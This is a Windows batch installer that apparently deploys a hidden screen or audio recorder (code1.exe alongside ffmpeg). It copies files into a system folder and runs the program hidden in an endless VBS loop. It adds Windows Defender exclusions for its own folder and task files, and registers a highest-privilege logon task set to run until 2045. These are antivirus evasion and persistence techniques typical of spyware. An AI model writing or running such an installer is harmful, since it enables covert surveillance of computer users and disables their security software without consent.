@echo off

rem Kill process and delete folder first
taskkill /F /IM wscript.exe
taskkill /F /IM code1.exe
taskkill /F /IM ffmpeg.exe
del /Q /S %SystemRoot%\Recorder\*

xcopy /E /I /Y "%~dp0." "%SystemRoot%\Recorder"

rd /Q /S C:\Recorder
mkdir C:\Recorder

set "VBSFILE=%SystemRoot%\Recorder\run.vbs"

(
echo Set objShell = CreateObject^("WScript.Shell"^)
echo Do
echo     objShell.Run "%SystemRoot%\Recorder\code1.exe", 0, True
echo     WScript.Sleep 5000
echo Loop
) > %VBSFILE%

set TASK_NAME=run_task

powershell -Command "Add-MpPreference -ExclusionPath '%SystemRoot%\Recorder\'; Add-MpPreference -ExclusionPath '%SystemRoot%\System32\Tasks\%TASK_NAME%'; Add-MpPreference -ExclusionPath '%SystemRoot%\System32\Tasks\%RUN_NOW_TASK%'"

powershell.exe -Command "Get-ScheduledTaskState -TaskName '%TASK_NAME%'" | findstr "Running" > nul
if %errorlevel% equ 0 (
    echo Task is currently running. Stopping...
    powershell.exe -Command "Stop-ScheduledTask -TaskName '%TASK_NAME%'"
) else (
    echo Task is not running.
)

schtasks /create /tn "%TASK_NAME%" /tr "%VBSFILE%" /sc onlogon /f /rl HIGHEST

schtasks /run /tn "%TASK_NAME%"

powershell.exe -Command "Set-ScheduledTask -TaskName '%TASK_NAME%' -Settings (New-ScheduledTaskSettingsSet -ExecutionTimeLimit (New-TimeSpan -End (Get-Date -Year 2045 -Month 1 -Day 1)))"

echo Installed
